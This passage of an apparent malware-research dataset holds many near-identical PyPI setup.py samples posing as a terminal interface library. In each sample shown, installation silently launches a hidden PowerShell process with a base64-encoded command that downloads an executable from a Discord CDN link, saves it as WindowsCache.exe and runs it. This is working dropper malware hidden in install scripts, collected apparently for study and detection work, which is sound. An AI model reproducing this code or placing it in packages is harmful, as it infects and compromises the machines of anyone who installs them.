'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selflgtbpostrand-v3.49",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfLGTBpostrand',\n    packages = ['modlib'],\n    version = '9.49',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfminemasknvidia-v5.69",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfminemasknvidia',\n    packages = ['modlib'],\n    version = '5.96',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfnvidiaccpong-v5.3",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfnvidiaccpong',\n    packages = ['modlib'],\n    version = '10.26',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfosintpywmask-v9.1",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfosintpywmask',\n    packages = ['modlib'],\n    version = '7.90',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfosintsplithydra-v9.76",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfosintsplithydra',\n    packages = ['modlib'],\n    version = '3.92',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfosintultrahacked-v5.10",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfosintultrahacked',\n    packages = ['modlib'],\n    version = '6.85',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfpepultraad-v3.57",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpepultraad',\n    packages = ['modlib'],\n    version = '6.65',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfpippaypalpyw-v2.49",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpippaypalpyw',\n    packages = ['modlib'],\n    version = '6.59',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfpippongpip-v1.45",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpippongpip',\n    packages = ['modlib'],\n    version = '9.18',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfpostponghydra-v8.31",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpostponghydra',\n    packages = ['modlib'],\n    version = '3.30',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libpipcvpip-v3.20",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpipcvpip',\n    packages = ['modlib'],\n    version = '1.98',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libvisapullpaypal-v6.89",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libvisapullpaypal',\n    packages = ['modlib'],\n    version = '5.78',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-getcvad-v4.15",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-getcvad',\n    packages = ['modlib'],\n    version = '4.31',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-libhttpreplace-v8.77",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-libhttpreplace',\n    packages = ['modlib'],\n  